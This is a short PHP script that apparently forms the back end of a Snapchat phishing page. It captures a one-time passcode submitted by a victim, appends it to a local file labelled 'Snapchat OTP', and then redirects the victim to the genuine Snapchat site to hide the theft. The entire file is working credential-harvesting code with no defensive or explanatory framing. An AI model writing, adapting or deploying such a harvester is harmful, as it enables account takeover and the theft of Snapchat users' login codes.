<?php
file_put_contents("otp.txt", "Snapchat OTP : " .  $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://www.snapchat.com/l/en-gb/');
?>
